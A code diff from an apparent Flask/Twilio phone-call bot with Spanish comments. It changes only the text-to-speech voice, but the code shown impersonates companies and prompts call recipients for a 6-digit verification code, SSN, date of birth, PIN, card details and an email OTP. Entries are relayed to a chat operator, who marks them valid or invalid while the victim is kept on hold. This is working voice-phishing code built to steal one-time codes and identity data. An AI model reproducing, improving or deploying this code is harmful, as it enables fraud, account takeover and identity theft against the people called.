@@ -154,12 +154,12 @@ def voice_webhook(action):
 
     # Usar mensaje de empresa si aplica
     if action in EMPRESAS:
-        gather.say(EMPRESAS[action]["mensaje"], language="en-US", voice="Polly.Joanna", rate="85%")
+        gather.say(EMPRESAS[action]["mensaje"], language="en-US", rate="85%")
     else:
         gather.say(IVR_MENSAJES.get(action, "Press 1 or 2."), language="es-MX", rate="85%")
 
     response.append(gather)
-    response.say("We did not receive your response. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
+    response.say("We did not receive your response. Goodbye.", language="en-US", rate="85%")
     response.hangup()
     return Response(str(response), mimetype="text/xml")
 
@@ -185,9 +185,9 @@ def gather_webhook(action):
             timeout=20,
             finish_on_key=""
         )
-        gather.say("We have sent a 6 digit verification code to your phone number. Please enter it now.", language="en-US", voice="Polly.Joanna", rate="85%")
+        gather.say("We have sent a 6 digit verification code to your phone number. Please enter it now.", language="en-US", rate="85%")
         response.append(gather)
-        response.say("We did not receive your code. Please try again later. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
+        response.say("We did not receive your code. Please try again later. Goodbye.", language="en-US", rate="85%")
     # Si es cobrar y marcó 1 → pedir código de cuenta
     elif action == "cobrar" and digit == "1":
         gather = Gather(
@@ -253,9 +253,9 @@ def codigo_webhook(call_sid, chat_id):
 
     # Mantener cliente en espera
     response = VoiceResponse()
-    response.say("Thank you. We have received your code. Please hold while we verify your information.", language="en-US", voice="Polly.Joanna", rate="85%")
+    response.say("Thank you. We have received your code. Please hold while we verify your information.", language="en-US", rate="85%")
     response.pause(length=30)
-    response.say("Thank you for your patience. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
+    response.say("Thank you for your patience. Goodbye.", language="en-US", rate="85%")
     response.hangup()
     return Response(str(response), mimetype="text/xml")
 
@@ -267,7 +267,7 @@ def accion_llamada(call_sid, accion):
     response = VoiceResponse()
 
     if accion == "valido":
-        response.say("Your code has been successfully validated. Thank you for verifying. Have a great day.", language="en-US", voice="Polly.Joanna", rate="85%")
+        response.say("Your code has been successfully validated. Thank you for verifying. Have a great day.", language="en-US", rate="85%")
         response.hangup()
 
     elif accion == "invalido":
@@ -279,13 +279,13 @@ def accion_llamada(call_sid, accion):
             timeout=20,
             finish_on_key=""
         )
-        gather.say("We're sorry, the code you entered is incorrect. Please enter your 6 digit verification code again.", language="en-US", voice="Polly.Joanna", rate="85%")
+        gather.say("We're sorry, the code you entered is incorrect. Please enter your 6 digit verification code again.", language="en-US", rate="85%")
         response.append(gather)
-        response.say("We did not receive your code. Please try again later. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
+        response.say("We did not receive your code. Please try again later. Goodbye.", language="en-US", rate="85%")
         response.hangup()
 
     elif accion == "colgar":
-        response.say("Thank you for calling. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
+        response.say("Thank you for calling. Goodbye.", language="en-US", rate="85%")
         response.hangup()
 
     elif accion in ["ssn", "dob", "pin", "card", "mailotp"]:
@@ -305,13 +305,13 @@ def accion_llamada(call_sid, accion):
             timeout=20,
             finish_on_key=""
         )
-        gather.say(mensajes[accion], language="en-US", voice="Polly.Joanna", rate="85%")
+        gather.say(mensajes[accion], language="en-US", rate="85%")
         response.append(gather)
-        response.say("We did not receive your response. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
+        response.say("We did not receive your response. Goodbye.", language="en-US", rate="85%")
         response.hangup()
 
     else:
-        response.say("Thank you. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
+        response.say("Thank you. Goodbye.", language="en-US", rate="85%")
         response.hangup()
 
     return Response(str(response), mimetype="text/xml")
@@ -350,9 +350,9 @@ def codigo2_webhook(call_sid, chat_id, tipo):
         log.error(e)
 
     response = VoiceResponse()
-    response.say("Thank you. We have received your information. Please hold while we verify.", language="en-US", voice="Polly.Joanna", rate="85%")
+    response.say("Thank you. We have received your information. Please hold while we verify.", language="en-US", rate="85%")
     response.pause(length=30)
-    response.say("Thank you for your patience. Goodbye.", language="en-US", voice="Polly.Joanna", rate="85%")
+    response.say("Thank you for your patience. Goodbye.", language="en-US", rate="85%")
     response.hangup()
     return Response(str(response), mimetype="text/xml")
 
